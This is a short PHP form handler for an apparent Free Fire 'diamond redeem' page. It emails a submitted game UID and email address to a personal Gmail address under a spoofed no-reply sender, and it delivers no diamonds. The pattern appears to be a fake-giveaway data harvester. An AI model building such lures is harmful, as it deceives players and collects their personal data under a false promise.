<?php
if(isset($_POST['uid']) && isset($_POST['email'])) {
    $uid = $_POST['uid'];
    $email = $_POST['email'];
    
    $to = 'khanziazk457@gmail.com';  // آپ کی ای میل
    $subject = 'Diamond Redeem Request';
    $message = "UID: $uid\nEmail: $email\nDiamonds: 70";
    $headers = "From: no-reply@ffdiamondhub.com\r\n";

    if(mail($to, $subject, $message, $headers)) {
        echo "UID successfully sent!";
    } else {
        echo "Failed to send email.";
    }
}
?>
